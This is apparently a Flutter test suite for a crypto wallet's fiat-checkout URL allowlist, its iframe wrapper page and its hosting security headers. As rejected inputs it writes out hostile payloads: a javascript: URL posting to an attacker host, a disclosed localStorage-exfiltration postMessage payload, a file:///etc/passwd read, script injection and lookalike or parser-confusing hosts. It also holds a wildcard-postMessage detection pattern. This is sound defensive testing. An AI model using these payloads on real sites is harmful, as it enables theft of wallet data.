import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:web_dex/bloc/fiat/base_fiat_provider.dart';
import 'package:web_dex/bloc/fiat/fiat_checkout_url_allowlist.dart';

/// `assets/web_pages/fiat_widget.html` turns a base64 query parameter into an
/// iframe `src` inside the wallet's own origin. These tests pin the check that
/// stands between that parameter and the iframe, on both sides: the Dart
/// caller, and the deployed HTML asset that already-shipped desktop and mobile
/// builds fetch straight from production.
const String _widgetAssetPath = 'assets/web_pages/fiat_widget.html';

void main() {
  group('Fiat checkout URL allowlist:', () {
    test('accepts the known provider checkout hosts', () {
      for (final host in kFiatCheckoutAllowedHosts) {
        expect(
          isAllowedFiatCheckoutUrl('https://$host/checkout?orderId=abc'),
          isTrue,
          reason: '$host should be an approved checkout host',
        );
      }
    });

    test('accepts sub-domains of the provider domains', () {
      expect(isAllowedFiatCheckoutUrl('https://gleec.banxa.com/'), isTrue);
      expect(isAllowedFiatCheckoutUrl('https://banxa.com/'), isTrue);
      expect(isAllowedFiatCheckoutUrl('https://a.b.ramp.network/'), isTrue);
    });

    test('rejects every non-https scheme', () {
      const hostile = <String>[
        'javascript:fetch("https://attacker.example",{method:"POST"})',
        // The exact payload shape from the disclosure.
        "javascript:parent.postMessage(JSON.stringify(localStorage),'*')",
        'data:text/html,<script>alert(1)</script>',
        'blob:https://komodo.banxa.com/1234',
        'file:///etc/passwd',
        'http://komodo.banxa.com/',
        'vbscript:msgbox(1)',
      ];

      for (final url in hostile) {
        expect(
          isAllowedFiatCheckoutUrl(url),
          isFalse,
          reason: '$url must not reach the iframe',
        );
      }
    });

    test('rejects hosts that only look like a provider', () {
      const lookalikes = <String>[
        'https://attacker.example/',
        // Suffix matching without the leading dot would accept this.
        'https://evilbanxa.com/',
        'https://notramp.network/',
        // The provider name as a sub-domain of someone else's domain.
        'https://komodo.banxa.com.attacker.example/',
        'https://banxa.com.attacker.example/',
        // Credentials make the real host the part after the `@`.
        'https://komodo.banxa.com@attacker.example/',
        'https://komodo.banxa.com:pass@attacker.example/',
      ];

      for (final url in lookalikes) {
        expect(
          isAllowedFiatCheckoutUrl(url),
          isFalse,
          reason: '$url must not reach the iframe',
        );
      }
    });

    test('rejects URLs that two parsers would read differently', () {
      // Dart treats the backslash as part of the userinfo; a browser treats it
      // as a path separator, so the two disagree about which host this is.
      expect(
        isAllowedFiatCheckoutUrl(r'https://attacker.example\@komodo.banxa.com/'),
        isFalse,
      );
      // Browsers strip tabs and newlines before parsing; Dart does not.
      expect(
        isAllowedFiatCheckoutUrl('https://attacker.example\t/'),
        isFalse,
      );
      expect(
        isAllowedFiatCheckoutUrl('https://komodo.banxa\n.com/'),
        isFalse,
      );
    });

    test('rejects empty, relative and unparseable values', () {
      expect(isAllowedFiatCheckoutUrl(null), isFalse);
      expect(isAllowedFiatCheckoutUrl(''), isFalse);
      expect(isAllowedFiatCheckoutUrl('//komodo.banxa.com/'), isFalse);
      expect(isAllowedFiatCheckoutUrl('/checkout'), isFalse);
      expect(isAllowedFiatCheckoutUrl('komodo.banxa.com'), isFalse);
      expect(isAllowedFiatCheckoutUrl('https:/komodo.banxa.com'), isFalse);
    });

    test('normalises case and the fully-qualified trailing dot', () {
      expect(isAllowedFiatCheckoutUrl('https://KOMODO.BANXA.COM/'), isTrue);
      expect(isAllowedFiatCheckoutHost('komodo.banxa.com.'), isTrue);
      expect(isAllowedFiatCheckoutHost(''), isFalse);
    });
  });

  group('fiatWrapperPageUrl:', () {
    // Chosen so that its standard-base64 encoding contains both `+` and `/`,
    // which is what makes the escaping below observable at all.
    const providerUrl = 'https://komodo.banxa.com/checkout?orderId=aa~bb?ref=x';

    test('refuses to wrap a URL that is not an approved provider', () {
      expect(
        () => BaseFiatProvider.fiatWrapperPageUrl('javascript:alert(1)'),
        throwsArgumentError,
      );
      expect(
        () => BaseFiatProvider.fiatWrapperPageUrl('https://attacker.example/'),
        throwsArgumentError,
      );
    });

    test('escapes the payload so URLSearchParams cannot corrupt it', () {
      final wrapped = BaseFiatProvider.fiatWrapperPageUrl(providerUrl);
      final rawQuery = Uri.parse(wrapped).query;

      expect(base64.encode(utf8.encode(providerUrl)), contains('+'));
      // The wrapper page reads this parameter with URLSearchParams, which
      // decodes a literal `+` in the query as a space. Escaped, it survives.
      expect(
        rawQuery,
        isNot(contains('+')),
        reason: 'a literal `+` on the wire is read back as a space',
      );
    });

    test('stays decodable by the wrapper page already deployed to users', () {
      // Desktop and mobile builds fetch the wrapper from getOriginUrl(), which
      // is production, which is deployed by hand and lags this code. The page
      // sitting there calls `atob` on the URLSearchParams value with no
      // normalisation, and `atob` rejects base64url's `-` and `_`. Sending
      // anything it cannot decode turns the buy flow into a blank page for
      // every already-shipped native client until production is redeployed.
      final wrapped = BaseFiatProvider.fiatWrapperPageUrl(providerUrl);
      final param = Uri.parse(wrapped).queryParameters['fiatUrl'];

      expect(param, isNotNull);
      expect(
        param,
        isNot(matches(RegExp('[-_]'))),
        reason: 'base64url is not decodable by the deployed wrapper page',
      );
      expect(
        utf8.decode(base64.decode(param!)),
        providerUrl,
        reason: 'the deployed wrapper page must recover the exact provider URL',
      );
    });
  });

  group('fiat_widget.html:', () {
    late String widgetSource;

    setUpAll(() {
      final file = File(_widgetAssetPath);
      expect(
        file.existsSync(),
        isTrue,
        reason: 'run this suite from the repository root',
      );
      widgetSource = file.readAsStringSync();
    });

    test('carries the same allowlists as the Dart source', () {
      expect(
        _jsStringArray(widgetSource, 'KOMODO_ALLOWED_CHECKOUT_HOSTS'),
        kFiatCheckoutAllowedHosts,
        reason: 'the deployed asset defends already-shipped clients on its '
            'own, so its host list has to match this one exactly',
      );
      expect(
        _jsStringArray(widgetSource, 'KOMODO_ALLOWED_CHECKOUT_DOMAINS'),
        kFiatCheckoutAllowedDomains,
      );
    });

    test('validates the decoded URL before it becomes an iframe src', () {
      // Guards against the check being edited out of the shipped asset, which
      // Dart-side tests would otherwise never notice.
      expect(widgetSource, contains("parsed.protocol !== 'https:'"));
      expect(widgetSource, contains('_komodoIsAllowedCheckoutHost'));
      expect(widgetSource, contains('parsed.username || parsed.password'));
      // The validated, re-serialised URL is what gets loaded.
      expect(
        widgetSource,
        contains("document.getElementById('fiat-onramp-iframe').src = approvedUrl;"),
      );
      // No base argument: a relative URL must fail rather than resolve against
      // the wallet's own origin.
      expect(widgetSource, contains('parsed = new URL(rawUrl);'));
    });

    test('does not let the framed page navigate the top window on its own', () {
      final sandbox = RegExp('sandbox="([^"]*)"').firstMatch(widgetSource);
      expect(sandbox, isNotNull);

      final tokens = sandbox!.group(1)!.split(RegExp(r'\s+'));
      expect(tokens, isNot(contains('allow-top-navigation')));
      // `-by-user-action` is not a sandbox flag; browsers reject the whole
      // token and silently drop it. The spelling below is the one that works.
      expect(tokens, contains('allow-top-navigation-by-user-activation'));
    });

    test('does not broadcast provider messages with a wildcard origin', () {
      // Quote-agnostic on purpose: the realistic regression is someone
      // debugging a broken relay and reaching for `'*'`, which a check pinned
      // to the pre-fix file's double-quoted spelling would not see.
      expect(
        _wildcardPostMessage.hasMatch(widgetSource),
        isFalse,
        reason: 'a wildcard target origin hands the provider payload to '
            'whatever origin is listening',
      );
      expect(widgetSource, contains('_komodoIsAllowedMessageOrigin'));
    });
  });

  test('no changed web page broadcasts with a wildcard target origin', () {
    // The other two pages this change touched have no tests of their own.
    for (final path in const <String>[
      'assets/web_pages/checkout_status_redirect.html',
      'assets/web_pages/bitrefill_widget.js',
    ]) {
      final file = File(path);
      expect(file.existsSync(), isTrue, reason: 'run from the repository root');
      expect(
        _wildcardPostMessage.hasMatch(file.readAsStringSync()),
        isFalse,
        reason: '$path must pin its postMessage target origin',
      );
    }
  });
  group('hosting config:', () {
    // The wrapper page's own allowlist is the fix; these headers are the
    // hardening layered on top, and they only exist on a site whose deployed
    // hosting config declares them. dex.gleec.com is a different Firebase
    // project from the RC site, so the thing to protect is that ONE config
    // reaches both: firebase.json holds a single `hosting` entry selected by a
    // deploy target, and .firebaserc maps that target to a site per project.
    // Nothing has to be kept in step by hand, so nothing can drift -- but the
    // mapping itself can be dropped, and production would then have no config
    // to deploy at all.
    late Map<String, dynamic> hostingConfig;
    late Map<String, dynamic> deployTargets;

    setUpAll(() {
      hostingConfig =
          _readJsonWithComments('firebase.json')['hosting']
              as Map<String, dynamic>;
      deployTargets =
          _readJsonWithComments('.firebaserc')['targets']
              as Map<String, dynamic>;
    });

    test('selects its site by deploy target rather than pinning one', () {
      expect(
        hostingConfig['target'],
        isNotNull,
        reason: 'a `site` key pins this config to one site, which is what '
            'stops the same headers reaching production and the local '
            'preview project',
      );
      expect(
        hostingConfig.containsKey('site'),
        isFalse,
        reason: 'firebase-tools rejects a config carrying both `site` and '
            '`target`',
      );
    });

    test('maps that target for production as well as the release candidate',
        () {
      final target = hostingConfig['target'] as String;

      for (final entry in <String, String>{
        // project -> the site it must resolve to.
        'komodo-wallet-official': 'walletrc',
        'gleec-wallet-official': 'gleec-wallet-official',
      }.entries) {
        final hosting =
            (deployTargets[entry.key] as Map<String, dynamic>?)?['hosting']
                as Map<String, dynamic>?;
        expect(
          (hosting?[target] as List<dynamic>?)?.cast<String>(),
          <String>[entry.value],
          reason: 'without this mapping `firebase deploy --only '
              'hosting:$target --project ${entry.key}` cannot resolve a site, '
              'so ${entry.value} cannot be deployed from this config at all',
        );
      }
    });

    test('keeps the caching rules the RC site already relied on', () {
      // Not this PR's header, but this PR restructured the file it lives in.
      // Nothing else asserts it, so a future merge could drop it silently.
      expect(
        _headerValue(
          hostingConfig,
          '/assets/packages/komodo_defi_framework/assets/coin_icons/**',
          'Cache-Control',
        ),
        contains('max-age=2592000'),
        reason: 'coin icons are re-validated on every visit without this',
      );
    });

    test('sets the header values the deploy verifier checks for', () {
      // Values, not just keys: `frame-ancestors *` and `X-Frame-Options:
      // ALLOWALL` keep every key in place while removing the protection, and
      // a key-only assertion would call that green.
      expect(
        _headerValue(hostingConfig, '**', 'Content-Security-Policy'),
        contains("frame-ancestors 'self'"),
        reason: 'the wallet must not allow itself to be framed cross-origin',
      );
      expect(_headerValue(hostingConfig, '**', 'X-Frame-Options'), 'SAMEORIGIN');
      expect(
        _headerValue(hostingConfig, '**', 'X-Content-Type-Options'),
        'nosniff',
      );
      expect(
        _headerValue(hostingConfig, '**', 'Referrer-Policy'),
        'strict-origin-when-cross-origin',
      );
      expect(
        _headerValue(hostingConfig, '**', 'Permissions-Policy'),
        isNotNull,
        reason: 'the wallet must send a Permissions-Policy',
      );
      expect(
        _headerValue(
          hostingConfig,
          '/assets/assets/web_pages/**',
          'Cache-Control',
        ),
        contains('must-revalidate'),
        reason: 'desktop and mobile fetch the wrapper page at runtime, so a '
            'cached copy outlives a fix to it',
      );
    });
  });
}

/// Any `postMessage(..., '*')` or `postMessage(..., "*")`.
final RegExp _wildcardPostMessage =
    RegExp('''postMessage\\([^)]*,\\s*['"]\\*['"]''');

/// Reads a `var <name> = ['a', 'b'];` array out of the widget's inline script.
///
/// Strict on purpose. This helper exists to notice when the deployed asset's
/// allowlist stops matching the Dart one, so every way of writing an entry
/// that it cannot read has to be an error rather than a quietly shorter list:
/// a second declaration, a commented-out entry, a double-quoted entry, or an
/// element that is not a string literal at all.
List<String> _jsStringArray(String source, String name) {
  final declarations =
      RegExp('$name\\s*=\\s*\\[([^\\]]*)\\]').allMatches(source).toList();
  expect(
    declarations,
    hasLength(1),
    reason: '$name must be assigned exactly once in $_widgetAssetPath',
  );
  expect(
    RegExp('$name\\s*=(?!=)').allMatches(source),
    hasLength(1),
    reason: '$name must be assigned exactly once in $_widgetAssetPath',
  );
  expect(
    RegExp('$name\\s*\\.\\s*'
            '(push|pop|shift|unshift|splice|sort|reverse|fill|copyWithin)\\b')
        .hasMatch(source),
    isFalse,
    reason: '$name must not be mutated after it is declared',
  );

  // A `//` comment inside the array would otherwise leave a dropped entry
  // still visible to the literal match below.
  final body = declarations.single
      .group(1)!
      .split('\n')
      .map((line) {
        final comment = line.indexOf('//');
        return comment == -1 ? line : line.substring(0, comment);
      })
      .join('\n');

  final literal = RegExp('''['"]([^'"]*)['"]''');
  expect(
    body.replaceAll(literal, '').replaceAll(RegExp(r'[\s,]'), ''),
    isEmpty,
    reason: '$name must hold nothing but quoted string literals',
  );

  return literal.allMatches(body).map((match) => match.group(1)!).toList();
}

/// The value of [key] in the `headers` entry matching [source], or null.
String? _headerValue(
  Map<String, dynamic> hostingConfig,
  String source,
  String key,
) {
  final entry = (hostingConfig['headers'] as List<dynamic>)
      .cast<Map<String, dynamic>>()
      .firstWhere(
        (entry) => entry['source'] == source,
        orElse: () => <String, dynamic>{'headers': <dynamic>[]},
      );

  for (final header
      in (entry['headers'] as List<dynamic>).cast<Map<String, dynamic>>()) {
    if (header['key'] == key) return header['value'] as String?;
  }
  return null;
}

/// Reads a JSON-with-comments file from the repository root.
Map<String, dynamic> _readJsonWithComments(String path) {
  final file = File(path);
  expect(file.existsSync(), isTrue, reason: 'run from the repository root');

  try {
    return jsonDecode(_stripJsonComments(file.readAsStringSync()))
        as Map<String, dynamic>;
  } on FormatException catch (error) {
    fail('$path did not parse after comments were stripped, so these tests '
        'could not run: $error');
  }
}

/// Strips `//` and `/* */` comments outside string literals.
///
/// firebase-tools reads firebase.json as JSON-with-comments, and this file is
/// comment-heavy. Handling only whole-line `//` would make these tests fail on
/// a trailing comment that firebase-tools itself accepts, reporting a config
/// problem where there is none.
String _stripJsonComments(String source) {
  final out = StringBuffer();
  var inString = false;
  var escaped = false;
  var i = 0;

  while (i < source.length) {
    final char = source[i];

    if (inString) {
      out.write(char);
      if (escaped) {
        escaped = false;
      } else if (char == r'\') {
        escaped = true;
      } else if (char == '"') {
        inString = false;
      }
      i++;
      continue;
    }

    if (char == '"') {
      inString = true;
      out.write(char);
      i++;
      continue;
    }

    if (source.startsWith('//', i)) {
      final end = source.indexOf('\n', i);
      i = end == -1 ? source.length : end;
      continue;
    }

    if (source.startsWith('/*', i)) {
      final end = source.indexOf('*/', i + 2);
      i = end == -1 ? source.length : end + 2;
      continue;
    }

    out.write(char);
    i++;
  }

  return out.toString();
}
